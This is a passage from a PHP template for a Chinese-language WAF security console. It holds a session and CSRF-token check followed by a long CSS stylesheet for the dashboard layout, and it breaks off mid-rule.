<?php
defined('ABSPATH') || exit;

require_once __DIR__ . '/../Support/Functions.php';

if (session_status() !== PHP_SESSION_ACTIVE) session_start();
$ok1 = isset($_SESSION['waf_ok1']) && $_SESSION['waf_ok1'] > time();
$ok2 = isset($_SESSION['waf_ok2']) && $_SESSION['waf_ok2'] > time();
$ipOk = isset($_SESSION['waf_ip']) && $_SESSION['waf_ip'] === waf_get_real_ip();
if (!$ok1 || !$ok2 || !$ipOk) { http_response_code(403); exit; }

if (empty($_SESSION['waf_csrf_token'])) {
    if (function_exists('random_bytes')) {
        $_SESSION['waf_csrf_token'] = bin2hex(random_bytes(16));
    } elseif (function_exists('openssl_random_pseudo_bytes')) {
        $_SESSION['waf_csrf_token'] = bin2hex(openssl_random_pseudo_bytes(16));
    } else {
        $_SESSION['waf_csrf_token'] = bin2hex(mt_rand()) . uniqid();
    }
}
$csrf_token = $_SESSION['waf_csrf_token'];

$version = defined('SHIELD_WAF_VERSION') ? SHIELD_WAF_VERSION : '3.0.0';
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>盾甲 WAF · 安全控制台</title>
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{
  --bg:#070b14;--bg2:#0b1220;--panel:rgba(15,23,42,.6);
  --border:rgba(148,163,184,.08);--border2:rgba(148,163,184,.12);
  --text:#e2e8f0;--text2:#94a3b8;--text3:#64748b;--text4:#475569;
  --cyan:#06b6d4;--blue:#3b82f6;--purple:#8b5cf6;--pink:#ec4899;
  --green:#10b981;--yellow:#f59e0b;--red:#ef4444;--orange:#f97316;
  --grad-1:linear-gradient(135deg,#06b6d4,#3b82f6);
  --grad-2:linear-gradient(135deg,#8b5cf6,#ec4899);
  --grad-3:linear-gradient(135deg,#10b981,#06b6d4);
  --grad-4:linear-gradient(135deg,#f59e0b,#ef4444);
  --glow-cyan:0 0 20px rgba(6,182,212,.3);
  --glow-purple:0 0 20px rgba(139,92,246,.3);
}
html,body{height:100%;background:var(--bg);color:var(--text);font-family:"Inter","PingFang SC","Microsoft YaHei",-apple-system,sans-serif;overflow:hidden;font-size:14px}
body{display:flex}

/* 滚动条 */
::-webkit-scrollbar{width:6px;height:6px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:rgba(148,163,184,.15);border-radius:3px}
::-webkit-scrollbar-thumb:hover{background:rgba(148,163,184,.3)}

/* ========== 侧边栏 ========== */
.sidebar{width:240px;min-width:240px;background:linear-gradient(180deg,var(--bg2),var(--bg));border-right:1px solid var(--border);display:flex;flex-direction:column;height:100vh;position:relative;z-index:10}
.sidebar::after{content:'';position:absolute;top:0;right:0;width:1px;height:100%;background:linear-gradient(180deg,transparent,rgba(6,182,212,.2),transparent)}
.logo{padding:24px 20px;display:flex;align-items:center;gap:12px;border-bottom:1px solid var(--border)}
.logo-icon{width:40px;height:40px;border-radius:12px;background:var(--grad-1);display:flex;align-items:center;justify-content:center;font-size:20px;box-shadow:var(--glow-cyan)}
.logo-text{font-weight:700;font-size:16px;letter-spacing:.5px}
.logo-text small{display:block;font-size:10px;color:var(--text3);font-weight:400;letter-spacing:1px;text-transform:uppercase;margin-top:2px}
.nav{flex:1;padding:16px 12px;overflow-y:auto}
.nav-section{margin-bottom:20px}
.nav-title{font-size:11px;color:var(--text4);text-transform:uppercase;letter-spacing:1px;padding:8px 12px;margin-bottom:4px;font-weight:600}
.nav-item{display:flex;align-items:center;gap:12px;padding:10px 14px;border-radius:10px;cursor:pointer;color:var(--text2);transition:all .2s;margin-bottom:2px;position:relative}
.nav-item:hover{background:rgba(148,163,184,.06);color:var(--text)}
.nav-item.active{background:linear-gradient(90deg,rgba(6,182,212,.12),transparent);color:#22d3ee}
.nav-item.active::before{content:'';position:absolute;left:0;top:10%;height:80%;width:3px;border-radius:2px;background:var(--cyan);box-shadow:var(--glow-cyan)}
.nav-item .icon{font-size:16px;width:20px;text-align:center}
.nav-item .label{flex:1;font-size:13px;font-weight:500}
.nav-item .badge{background:rgba(239,68,68,.2);color:var(--red);font-size:10px;padding:2px 6px;border-radius:6px;font-weight:600}
.sidebar-footer{padding:16px;border-top:1px solid var(--border)}
.ver-cell{display:flex;justify-content:space-between;font-size:11px;color:var(--text3);margin-bottom:6px}
.ver-cell span:last-child{color:var(--green)}
.ver-cell.warn span:last-child{color:var(--yellow)}

/* ========== 主内容区 ========== */
.main{flex:1;display:flex;flex-direction:column;height:100vh;overflow:hidden}
.topbar{height:60px;min-height:60px;border-bottom:1px solid var(--border);display:flex;align-items:center;padding:0 28px;gap:20px;background:rgba(7,11,20,.8);backdrop-filter:blur(12px);position:relative;z-index:5}
.topbar-left{display:flex;align-items:center;gap:16px}
.page-title{font-size:18px;font-weight:700}
.page-sub{font-size:12px;color:var(--text3);margin-top:2px}
.topbar-right{margin-left:auto;display:flex;align-items:center;gap:16px}
.search-box{position:relative}
.search-box input{background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:10px;padding:8px 14px 8px 36px;color:var(--text);font-size:13px;width:240px;outline:none;transition:all .2s}
.search-box input:focus{border-color:var(--cyan);box-shadow:0 0 0 3px rgba(6,182,212,.1)}
.search-box::before{content:'🔍';position:absolute;left:12px;top:50%;transform:translateY(-50%);font-size:12px;opacity:.5}
.status-dot{display:inline-flex;align-items:center;gap:8px;font-size:12px;color:var(--text2)}
.status-dot .dot{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 8px var(--green);animation:pulse-dot 2s infinite}
@keyframes pulse-dot{0%,100%{opacity:1}50%{opacity:.5}}
.clock{font-size:13px;color:var(--text2);font-variant-numeric:tabular-nums}

.content{flex:1;overflow-y:auto;padding:24px 28px}

/* ========== 页面切换 ========== */
.page{display:none;animation:fadeIn .3s ease}
.page.active{display:block}
@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}

/* ========== KPI 卡片 ========== */
.kpi-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;margin-bottom:20px}
.kpi-card{position:relative;background:var(--panel);border:1px solid var(--border);border-radius:16px;padding:20px;overflow:hidden;backdrop-filter:blur(12px);transition:all .3s}
.kpi-card:hover{border-color:var(--border2);transform:translateY(-2px)}
.kpi-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:var(--card-grad,var(--grad-1));opacity:.6}
.kpi-top{display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:12px}
.kpi-icon{width:40px;height:40px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:18px;background:var(--icon-bg,rgba(6,182,212,.15))}
.kpi-trend{font-size:11px;font-weight:600;padding:3px 8px;border-radius:6px}
.kpi-trend.up{background:rgba(239,68,68,.15);color:var(--red)}
.kpi-trend.down{background:rgba(16,185,129,.15);color:var(--green)}
.kpi-value{font-size:32px;font-weight:800;line-height:1;letter-spacing:-.5px;margin-bottom:6px;background:var(--card-grad,var(--grad-1));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;font-variant-numeric:tabular-nums}
.kpi-label{font-size:12px;color:var(--text2);font-weight:500}
.kpi-sub{font-size:11px;color:var(--text4);margin-top:4px}
.kpi-spark{position:absolute;bottom:12px;right:16px;opacity:.3}

/* ========== 图表网格 ========== */
.chart-row{display:grid;grid-template-columns:2fr 1fr;gap:16px;margin-bottom:20px}
.chart-row.two{grid-template-columns:1fr 1fr}
.chart-card{background:var(--panel);border:1px solid var(--border);border-radius:16px;padding:20px;backdrop-filter:blur(12px)}
.card-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px}
.card-title{font-size:13px;font-weight:600;color:var(--text2);display:flex;align-items:center;gap:8px}
.card-title .dot{width:6px;height:6px;border-radius:50%;background:var(--cyan)}
.card-actions{display:flex;gap:6px}
.chip{padding:4px 10px;border-radius:7px;font-size:11px;color:var(--text3);background:rgba(148,163,184,.06);cursor:pointer;transition:all .2s;border:1px solid transparent}
.chip:hover{color:var(--text)}
.chip.active{background:rgba(6,182,212,.1);color:var(--cyan);border-color:rgba(6,182,212,.2)}
.chart-wrap{position:relative;height:260px}

/* ========== 实时日志流 ========== */
.log-card{background:var(--panel);border:1px solid var(--border);border-radius:16px;padding:20px;backdrop-filter:blur(12px);margin-bottom:20px}
.log-stream{height:340px;overflow-y:auto;font-family:"JetBrains Mono","SF Mono",Consolas,monospace;font-size:12px;line-height:1.8;border-radius:10px;background:rgba(0,0,0,.3);padding:12px 16px;border:1px solid var(--border)}
.log-line{display:flex;gap:12px;animation:logSlide .3s ease}
@keyframes logSlide{from{opacity:0;transform:translateX(-10px)}to{opacity:1;transform:translateX(0)}}
.log-time{color:var(--text4);min-width:80px;font-variant-numeric:tabular-nums}
.log-level{min-width:60px;font-weight:700;text-transform:uppercase;font-size:10px;letter-spacing:.5px}
.log-level.critical{color:#f87171;text-shadow:0 0 10px rgba(248,113,113,.5)}
.log-level.high{color:#fb923c}
.log-level.medium{color:#facc15}
.log-level.low{color:#4ade80}
.log-ip{color:var(--text2);min-width:120px}
.log-msg{color:var(--text3);flex:1;word-break:break-all}

/* ========== 数据表格 ========== */
.table-card{background:var(--panel);border:1px solid var(--border);border-radius:16px;padding:20px;backdrop-filter:blur(12px);margin-bottom:20px}
table{width:100%;border-collapse:collapse;font-size:13px}
th{text-align:left;padding:12px 14px;color:var(--text3);font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.5px;border-bottom:1px solid var(--border);background:rgba(148,163,184,.03)}
td{padding:12px 14px;border-bottom:1px solid var(--border);color:var(--text2)}
tr:last-child td{border-bottom:none}
tr:hover td{background:rgba(148,163,184,.03)}
.tag{display:inline-block;padding:3px 8px;border-radius:6px;font-size:11px;font-weight:600}
.tag.red{background:rgba(239,68,68,.15);color:#f87171}
.tag.orange{background:rgba(249,115,22,.15);color:#fb923c}
.tag.yellow{background:rgba(245,158,11,.15);color:#facc15}
.tag.green{background:rgba(16,185,129,.15);color:#4ade80}
.tag.blue{background:rgba(59,130,246,.15);color:#60a5fa}
.tag.purple{background:rgba(139,92,246,.15);color:#a78bfa}
.tag.cyan{background:rgba(6,182,212,.15);color:#22d3ee}

.btn{padding:6px 14px;border-radius:8px;border:none;cursor:pointer;font-size:12px;font-weight:600;transition:all .2s;display:inline-flex;align-items:center;gap:6px}
.btn-primary{background:var(--grad-1);color:#070b14}
.btn-primary:hover{box-shadow:var(--glow-cyan)}
.btn-danger{background:rgba(239,68,68,.15);color:var(--red)}
.btn-danger:hover{background:rgba(239,68,68,.25)}
.btn-success{background:rgba(16,185,129,.15);color:var(--green)}
.btn-success:hover{background:rgba(16,185,129,.25)}
.btn-ghost{background:rgba(148,163,184,.06);color:var(--text2)}
.btn-ghost:hover{background:rgba(148,163,184,.12)}

/* ========== 开关组件 ========== */
.switch{position:relative;display:inline-block;width:44px;height:24px}
.switch input{opacity:0;width:0;height:0}
.slider{position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background-color:rgba(148,163,184,.2);transition:.3s;border-radius:24px}
.slider:before{position:absolute;content:"";height:18px;width:18px;left:3px;bottom:3px;background-color:#94a3b8;transition:.3s;border-radius:50%}
input:checked + .slider{background:var(--grad-1)}
input:checked + .slider:before{transform:translateX(20px);background-color:#fff;box-shadow:0 0 8px rgba(6,182,212,.5)}

/* ========== 概览页面特殊布局 ========== */
.hero-grid{display:grid;grid-template-columns:2fr 1fr;gap:16px;margin-bottom:20px}
.hero-left{background:linear-gradient(135deg,rgba(6,182,212,.08),rgba(139,92,246,.08));border:1px solid var(--border);border-radius:16px;padding:24px;position:relative;overflow:hidden}
.hero-left::before{content:'';position:absolute;top:-50%;right:-20%;width:400px;height:400px;background:radial-gradient(circle,rgba(6,182,212,.15),transparent 60%);pointer-events:none}
.hero-badge{display:inline-flex;align-items:center;gap:8px;background:rgba(16,185,129,.15);color:#4ade80;padding:6px 12px;border-radius:20px;font-size:11px;font-weight:600;margin-bottom:14px}
.hero-badge .dot{width:6px;height:6px;border-radius:50%;background:#4ade80;animation:pulse-dot 2s infinite}
.hero-title{font-size:26px;font-weight:800;margin-bottom:6px;background:linear-gradient(135deg,#fff,#94a3b8);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.hero-desc{font-size:13px;color:var(--text2);margin-bottom:20px;line-height:1.6}
.hero-stats{display:grid;grid-template-columns:repeat(4,1fr);gap:20px}
.hero-stat h4{font-size:24px;font-weight:800;color:var(--text);font-variant-numeric:tabular-nums}
.hero-stat p{font-size:11px;color:var(--text3);margin-top:4px}

.hero-right{background:var(--panel);border:1px solid var(--border);border-radius:16px;padding:20px;display:flex;flex-direction:column}
.world-map{flex:1;display:flex;align-items:center;justify-content:center;font-size:60px;opacity:.3;position:relative}
.map-dots{position:absolute;inset:0}
.map-dot{position:absolute;width:8px;height:8px;border-radius:50%;background:var(--red);box-shadow:0 0 10px var(--red);animation:mapPulse 2s infinite}
@keyframes mapPulse{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.5);opacity:.5}}

/* ========== 开关/滑块/折叠 ========== */
.switch{position:relative;display:inline-block;width:44px;height:24px}
.switch input{opacity:0;width:0;height:0}
.slider{position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background:rgba(148,163,184,.2);transition:.3s;border-radius:24px}
.slider:before{position:absolute;content:"";height:18px;width:18px;left:3px;bottom:3px;background:#fff;transition:.3s;border-radius:50%}
input:checked + .slider{background:var(--cyan);box-shadow:0 0 10px rgba(6,182,184,.4)}
input:checked + .slider:before{transform:translateX(20px)}

input[type=range]{-webkit-appearance:none;width:100%;height:6px;border-radius:3px;background:rgba(148,163,184,.15);outline:none}
input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:16px;height:16px;border-radius:50%;background:var(--cyan);cursor:pointer;box-shadow:0 0 8px rgba(6,182,212,.5);transition:.2s}
input[type=range]::-webkit-slider-thumb:hover{transform:scale(1.2)}
input[type=range]::-moz-range-thumb{width:16px;height:16px;border-radius:50%;background:var(--cyan);cursor:pointer;border:none}

.collapsible .card-head{cursor:pointer;user-select:none}
.collapsible .card-head .collapse-icon{transition:transform .3s;font-size:12px;color:var(--text3)}
.collapsible.collapsed .card-head .collapse-icon{transform:rotate(-90deg)}
.collapsible.collapsed .card-body{display:none}

.mode-tabs{display:flex;gap:6px}
.mode-tab{flex:1;padding:8px 12px;border-radius:8px;text-align:center;font-size:12px;cursor:pointer;background:rgba(148,163,184,.06);color:var(--text3);border:1px solid transparent;transition:all .2s}
.mode-tab:hover{color:var(--text)}
.mode-tab.active{background:rgba(6,182,212,.1);color:var(--cyan);border-color:rgba(6,182,212,.2)}

.setting-row{display:flex;align-items:center;justify-content:space-between;padding:12px 0;border-bottom:1px solid var(--border)}
.setting-row:last-child{border-bottom:none}
.setting-label{font-size:13px;color:var(--text2)}
.setting-desc{font-size:11px;color:var(--text4);margin-top:2px}
.setting-control{display:flex;align-items:center;gap:10px}

.weight-slider-wrap{display:flex;align-items:center;gap:10px;min-width:160px}
.weight-slider-wrap input[type=range]{flex:1}
.weight-val{min-width:32px;text-align:center;font-family:monospace;font-weight:600;color:var(--cyan);font-size:13px}

.add-row{display:flex;gap:8px;margin-bottom:12px}
.add-row input{flex:1;padding:7px 12px;background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;outline:none}
.add-row input:focus{border-color:var(--cyan)}

.honeypot-item{display:flex;align-items:center;gap:10px;padding:10px 12px;border-radius:8px;margin-bottom:6px;background:rgba(148,163,184,.03);border:1px solid var(--border)}
.honeypot-item .hp-url{flex:1;font-family:monospace;font-size:12px;color:var(--text2)}
.honeypot-item .hp-count{font-size:11px;color:var(--text4);min-width:60px;text-align:right}

.captcha-types{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin:12px 0}
.captcha-type{padding:12px 8px;border-radius:10px;text-align:center;cursor:pointer;background:rgba(148,163,184,.06);border:1px solid transparent;transition:all .2s}
.captcha-type:hover{border-color:var(--border2)}
.captcha-type.active{background:rgba(6,182,212,.1);border-color:rgba(6,182,212,.2);color:var(--cyan)}
.captcha-type .icon{font-size:20px;margin-bottom:4px}
.captcha-type .label{font-size:11px;font-weight:500}

.whitelist-type-tabs{display:flex;gap:6px;margin-bottom:12px}
.whitelist-type-tab{padding:6px 12px;border-radius:7px;font-size:11px;cursor:pointer;background:rgba(148,163,184,.06);color:var(--text3);transition:all .2s}
.whitelist-type-tab.active{background:rgba(6,182,212,.1);color:var(--cyan)}

/* ========== 语义引擎特有样式 ========== */
.semantic-tabs{display:flex;gap:6px;margin-bottom:16px;flex-wrap:wrap}
.semantic-tab{padding:8px 16px;border-radius:10px;font-size:12px;color:var(--text3);background:rgba(148,163,184,.06);cursor:pointer;transition:all .2s;border:1px solid transparent;font-weight:500}
.semantic-tab:hover{color:var(--text);background:rgba(148,163,184,.1)}
.semantic-tab.active{background:linear-gradient(135deg,rgba(6,182,212,.15),rgba(139,92,246,.15));color:#22d3ee;border-color:rgba(6,182,212,.3)}
.parser-list{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.parser-item{background:rgba(148,163,184,.04);border:1px solid var(--border);border-radius:12px;padding:14px;transition:all .2s}
.parser-item:hover{border-color:var(--border2);background:rgba(148,163,184,.06)}
.parser-head{display:flex;align-items:center;gap:10px;margin-bottom:8px}
.parser-name{flex:1;font-size:13px;font-weight:600}
.parser-detail{display:none;margin-top:12px;padding-top:12px;border-top:1px solid var(--border);animation:fadeIn .2s ease}
.parser-detail.open{display:block}
.parser-detail-row{display:flex;justify-content:space-between;font-size:12px;margin-bottom:6px}
.parser-detail-row span:first-child{color:var(--text3)}
.parser-detail-row span:last-child{color:var(--text);font-weight:500}
.parser-payload{background:rgba(0,0,0,.3);border-radius:6px;padding:8px 10px;font-family:monospace;font-size:11px;color:var(--red);margin-top:8px;word-break:break-all}
.slider-wrap{margin:12px 0}
.slider-label{display:flex;justify-content:space-between;font-size:12px;color:var(--text2);margin-bottom:8px}
.slider-label .value{color:var(--cyan);font-weight:600}
input[type="range"].semantic-slider{width:100%;height:6px;-webkit-appearance:none;background:rgba(148,163,184,.1);border-radius:3px;outline:none}
input[type="range"].semantic-slider::-webkit-slider-thumb{-webkit-appearance:none;width:18px;height:18px;border-radius:50%;background:var(--grad-1);cursor:pointer;box-shadow:0 0 10px rgba(6,182,212,.4)}
input[type="range"].semantic-slider::-moz-range-thumb{width:18px;height:18px;border-radius:50%;background:var(--grad-1);cursor:pointer;border:none;box-shadow:0 0 10px rgba(6,182,212,.4)}
.slider-steps{display:flex;justify-content:space-between;margin-top:6px;font-size:10px;color:var(--text4)}
.big-switch-wrap{display:flex;align-items:center;gap:16px;padding:20px;background:linear-gradient(135deg,rgba(6,182,212,.08),rgba(139,92,246,.08));border-radius:12px;margin-bottom:16px;border:1px solid var(--border)}
.big-switch-label{flex:1}
.big-switch-label h4{font-size:15px;margin-bottom:4px}
.big-switch-label p{font-size:12px;color:var(--text3)}
.big-switch{position:relative;width:60px;height:32px;background:rgba(148,163,184,.2);border-radius:16px;cursor:pointer;transition:all .3s}
.big-switch::after{content:'';position:absolute;top:3px;left:3px;width:26px;height:26px;border-radius:50%;background:#94a3b8;transition:all .3s}
.big-switch.on{background:var(--grad-1)}
.big-switch.on::after{left:31px;background:#fff;box-shadow:0 0 15px rgba(6,182,212,.6)}
.mode-selector{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-top:8px}
.mode-btn{padding:10px 12px;border-radius:10px;text-align:center;font-size:12px;background:rgba(148,163,184,.06);color:var(--text2);cursor:pointer;transition:all .2s;border:1px solid transparent}
.mode-btn:hover{background:rgba(148,163,184,.1);color:var(--text)}
.mode-btn.active{background:linear-gradient(135deg,rgba(6,182,212,.15),rgba(139,92,246,.15));color:#22d3ee;border-color:rgba(6,182,212,.3);font-weight:600}
.confusion-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:8px;margin-top:12px}
.confusion-item{padding:8px;text-align:center;background:rgba(148,163,184,.04);border-radius:8px;font-size:11px;color:var(--text2);border:1px solid var(--border)}
.confusion-item.supported{color:var(--green);border-color:rgba(16,185,129,.2);background:rgba(16,185,129,.06)}
.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.7);display:none;align-items:center;justify-content:center;z-index:1000;backdrop-filter:blur(4px)}
.modal-overlay.open{display:flex;animation:fadeIn .2s ease}
.modal-box{background:var(--bg2);border:1px solid var(--border);border-radius:16px;width:520px;max-height:80vh;display:flex;flex-direction:column;overflow:hidden}
.modal-head{padding:16px 20px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between}
.modal-head h4{font-size:14px}
.modal-close{cursor:pointer;color:var(--text3);font-size:18px;transition:color .2s}
.modal-close:hover{color:var(--text)}
.modal-body{padding:16px 20px;overflow-y:auto;flex:1}
.modal-foot{padding:12px 20px;border-top:1px solid var(--border);display:flex;justify-content:flex-end;gap:8px}
.wl-item{display:flex;align-items:center;gap:10px;padding:10px 12px;background:rgba(148,163,184,.04);border-radius:8px;margin-bottom:8px}
.wl-item .wl-text{flex:1;font-family:monospace;font-size:12px;color:var(--text2);word-break:break-all}
.wl-item .wl-del{color:var(--red);cursor:pointer;font-size:14px;opacity:.6;transition:opacity .2s}
.wl-item .wl-del:hover{opacity:1}
.wl-add-row{display:flex;gap:8px;margin-bottom:12px}
.wl-add-row input{flex:1;padding:8px 12px;background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;outline:none;font-family:monospace}
.wl-add-row input:focus{border-color:var(--cyan)}
.two-col-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
.stat-inline{display:flex;align-items:center;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--border)}
.stat-inline:last-child{border-bottom:none}
.stat-inline .stat-label{font-size:12px;color:var(--text2)}
.stat-inline .stat-val{font-size:14px;font-weight:700;color:var(--text)}

/* ========== 防护中心 ========== */
.protect-action-bar{display:flex;align-items:center;gap:12px;margin-bottom:20px;flex-wrap:wrap}
.protect-action-bar .btn{padding:8px 16px}
.mode-switcher{display:flex;background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:4px;gap:4px;margin-left:auto}
.mode-switcher .mode-btn{padding:6px 14px;border-radius:7px;font-size:12px;font-weight:600;cursor:pointer;color:var(--text3);transition:all .2s;border:none;background:transparent}
.mode-switcher .mode-btn.active{background:var(--grad-1);color:#070b14;box-shadow:var(--glow-cyan)}
.mode-switcher .mode-btn:hover:not(.active){color:var(--text)}

.protect-tabs{display:flex;gap:4px;margin-bottom:20px;background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:6px;flex-wrap:wrap}
.protect-tab{flex:1;min-width:100px;padding:10px 16px;text-align:center;border-radius:9px;font-size:13px;font-weight:600;cursor:pointer;color:var(--text3);transition:all .25s;position:relative}
.protect-tab:hover{color:var(--text)}
.protect-tab.active{background:rgba(6,182,212,.1);color:var(--cyan)}
.protect-tab.active::after{content:'';position:absolute;bottom:4px;left:50%;transform:translateX(-50%);width:20px;height:3px;border-radius:2px;background:var(--cyan);box-shadow:0 0 8px var(--cyan)}
.protect-tab .tab-count{display:inline-block;margin-left:6px;padding:1px 6px;border-radius:10px;font-size:10px;background:rgba(148,163,184,.1);color:var(--text3)}
.protect-tab.active .tab-count{background:rgba(6,182,212,.2);color:var(--cyan)}

.protect-panel{display:none}
.protect-panel.active{display:block;animation:fadeIn .3s ease}

.modules-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
.module-card{background:var(--panel);border:1px solid var(--border);border-radius:14px;padding:18px;transition:all .3s;position:relative;overflow:hidden}
.module-card:hover{border-color:var(--border2);transform:translateY(-2px)}
.module-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(6,182,212,.3),transparent);opacity:0;transition:opacity .3s}
.module-card:hover::before{opacity:1}
.module-card.disabled{opacity:.6}

.module-head{display:flex;align-items:flex-start;gap:12px;margin-bottom:12px}
.module-icon{width:44px;height:44px;border-radius:11px;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0}
.module-icon.core{background:rgba(239,68,68,.15);color:#f87171}
.module-icon.adv{background:rgba(249,115,22,.15);color:#fb923c}
.module-icon.proto{background:rgba(245,158,11,.15);color:#facc15}
.module-icon.session{background:rgba(59,130,246,.15);color:#60a5fa}
.module-icon.api{background:rgba(139,92,246,.15);color:#a78bfa}

.module-info{flex:1;min-width:0}
.module-name{font-size:14px;font-weight:700;margin-bottom:4px;display:flex;align-items:center;gap:8px}
.module-desc{font-size:12px;color:var(--text3);line-height:1.5}

.module-meta{display:flex;align-items:center;justify-content:space-between;margin-top:14px}
.risk-tag{font-size:10px;font-weight:700;padding:3px 8px;border-radius:6px;text-transform:uppercase;letter-spacing:.5px}
.risk-tag.high{background:rgba(239,68,68,.15);color:#f87171}
.risk-tag.medium{background:rgba(245,158,11,.15);color:#facc15}
.risk-tag.low{background:rgba(16,185,129,.15);color:#4ade80}

.module-config-btn{width:100%;margin-top:12px;padding:8px;background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;color:var(--text2);font-size:12px;font-weight:600;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:6px}
.module-config-btn:hover{background:rgba(148,163,184,.1);color:var(--text)}
.module-config-btn .chevron{transition:transform .3s;font-size:10px}
.module-card.config-open .module-config-btn .chevron{transform:rotate(180deg)}

.module-config-panel{max-height:0;overflow:hidden;transition:max-height .4s ease,opacity .3s ease,margin-top .3s ease,padding-top .3s ease;opacity:0}
.module-card.config-open .module-config-panel{max-height:400px;opacity:1;margin-top:14px;padding-top:14px;border-top:1px solid var(--border)}

.config-item{margin-bottom:12px}
.config-item:last-child{margin-bottom:0}
.config-label{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px}
.config-label span:first-child{font-size:12px;color:var(--text2);font-weight:500}
.config-label span:last-child{font-size:11px;color:var(--cyan);font-weight:600;font-variant-numeric:tabular-nums}

/* ========== 响应式 ========== */
@media(max-width:1200px){.kpi-grid{grid-template-columns:repeat(2,1fr)}.chart-row{grid-template-columns:1fr}.modules-grid{grid-template-columns:repeat(2,1fr)}}
@media(max-width:768px){.sidebar{display:none}.kpi-grid{grid-template-columns:1fr}.chart-row.two{grid-template-columns:1fr}.captcha-types{grid-template-columns:repeat(2,1fr)}.modules-grid{grid-template-columns:1fr}.protect-tab{min-width:80px;padding:8px 10px;font-size:12px}}

/* ========== 背景动效 ========== */
body::before{
  content:'';position:fixed;inset:0;z-index:0;pointer-events:none;
  background:
    linear-gradient(rgba(148,163,184,.03) 1px,transparent 1px),
    linear-gradient(90deg,rgba(148,163,184,.03) 1px,transparent 1px);
  background-size:40px 40px;
  animation:gridDrift 60s linear infinite;
}
@keyframes gridDrift{
  0%{background-position:0 0,0 0}
  100%{background-position:40px 40px,40px 40px}
}
body::after{
  content:'';position:fixed;inset:0;z-index:0;pointer-events:none;
  background:
    radial-gradient(ellipse 600px 400px at 15% 20%,rgba(6,182,212,.08),transparent 70%),
    radial-gradient(ellipse 500px 500px at 85% 30%,rgba(139,92,246,.08),transparent 70%),
    radial-gradient(ellipse 700px 500px at 50% 90%,rgba(59,130,246,.06),transparent 70%);
  animation:glowFloat 20s ease-in-out infinite alternate;
}
@keyframes glowFloat{
  0%{transform:translate(0,0) scale(1);opacity:.8}
  50%{transform:translate(20px,-10px) scale(1.05);opacity:1}
  100%{transform:translate(-15px,15px) scale(.95);opacity:.7}
}
.sidebar,.main{position:relative;z-index:1}

/* ========== 玻璃态增强 ========== */
.kpi-card,.chart-card,.log-card,.table-card,.module-card,.hero-left,.hero-right{
  position:relative;
  backdrop-filter:blur(16px) saturate(150%);
  -webkit-backdrop-filter:blur(16px) saturate(150%);
}
.kpi-card::after,.chart-card::after,.log-card::after,.table-card::after,.module-card::after{
  content:'';position:absolute;top:0;left:0;right:0;height:1px;
  background:linear-gradient(90deg,transparent,rgba(255,255,255,.08),transparent);
  pointer-events:none;
}
.kpi-card::before{
  background-size:200% 100%!important;
  animation:flowBar 3s linear infinite;
}
@keyframes flowBar{
  0%{background-position:0% 50%}
  100%{background-position:200% 50%}
}
.kpi-card:hover{
  transform:translateY(-4px);
  box-shadow:0 20px 40px -10px rgba(6,182,212,.15);
  border-color:rgba(6,182,212,.25);
}
.kpi-card:hover::after{
  background:linear-gradient(90deg,transparent,rgba(6,182,212,.3),transparent);
}

/* ========== 按钮升级 ========== */
.btn{position:relative;overflow:hidden}
.btn-primary{
  background:var(--grad-1);color:#070b14;font-weight:700;
  box-shadow:0 0 20px rgba(6,182,212,.2);
  animation:glowPulse 2s ease-in-out infinite;
}
@keyframes glowPulse{
  0%,100%{box-shadow:0 0 15px rgba(6,182,212,.25),0 0 30px rgba(6,182,212,.1)}
  50%{box-shadow:0 0 25px rgba(6,182,212,.4),0 0 50px rgba(6,182,212,.15)}
}
.btn-primary:hover{
  transform:translateY(-1px) scale(1.02);
  box-shadow:0 0 30px rgba(6,182,212,.5),0 0 60px rgba(6,182,212,.2);
}
.btn-primary:active{transform:translateY(0) scale(.98)}
.btn::after{
  content:'';position:absolute;top:50%;left:50%;width:0;height:0;
  background:rgba(255,255,255,.2);border-radius:50%;
  transform:translate(-50%,-50%);transition:width .4s,height .4s,opacity .4s;
  pointer-events:none;opacity:0;
}
.btn:hover::after{width:200px;height:200px;opacity:.3}
.btn:active::after{width:100px;height:100px;opacity:.5;transition:0s}

/* ========== 开关/滑块美化 ========== */
.slider{position:relative;overflow:hidden}
.slider::after{
